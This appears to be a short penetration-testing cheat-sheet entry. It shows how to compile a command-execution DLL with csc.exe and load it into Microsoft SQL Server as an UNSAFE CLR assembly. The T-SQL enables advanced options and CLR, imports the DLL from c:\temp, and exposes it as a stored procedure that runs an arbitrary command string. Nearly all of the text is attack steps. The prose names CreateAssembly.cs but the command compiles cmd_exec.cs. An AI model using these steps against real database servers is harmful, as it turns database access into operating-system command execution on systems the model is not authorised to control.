### MSSQL Custom Assemblies

We can compile the `CreateAssembly.cs` file with csc.exe:
- `csc.exe /target:library cmd_exec.cs`

Next, run these SQL Statements to load and run the custom assembly:

```
-- Select the msdb database
use msdb
-- Enable show advanced options on the server
sp_configure 'show advanced options',1
RECONFIGURE
GO
-- Enable clr on the server
sp_configure 'clr enabled',1
RECONFIGURE
GO
-- Import the assembly
CREATE ASSEMBLY my_assembly
FROM 'c:\temp\cmd_exec.dll'
WITH PERMISSION_SET = UNSAFE;
-- Link the assembly to a stored procedure
CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
GO
```
